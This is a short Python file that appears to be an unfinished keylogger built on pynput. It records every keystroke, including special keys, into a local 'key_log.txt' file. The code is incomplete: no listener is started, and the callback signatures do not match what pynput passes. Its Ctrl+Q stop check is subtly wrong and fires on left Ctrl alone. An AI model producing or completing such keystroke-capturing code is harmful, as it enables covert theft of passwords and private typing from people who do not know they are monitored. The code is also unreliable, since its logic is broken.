import pynput
from pynput.keyboard import Key, Listener, KeyCode

log_file = "key_log.txt"


def on_press_func(key, log_file_path):
    with open(log_file_path, "a") as f:
        try:
            if key == Key.space:
                f.write(" ")
            else:
                f.write(f"{key.char}")

        except AttributeError:
            f.write(f"[{key}]")  # Write special keys like [ENTER]


def on_release_func(key, log_file_path):
    if key == Key.ctrl_l and KeyCode(char="q"):
        # print("Ctrl + q pressed")

        return False

    # Turning off the stop key
    # if key == Key.esc:
    #     # Stop listener
    #     return False
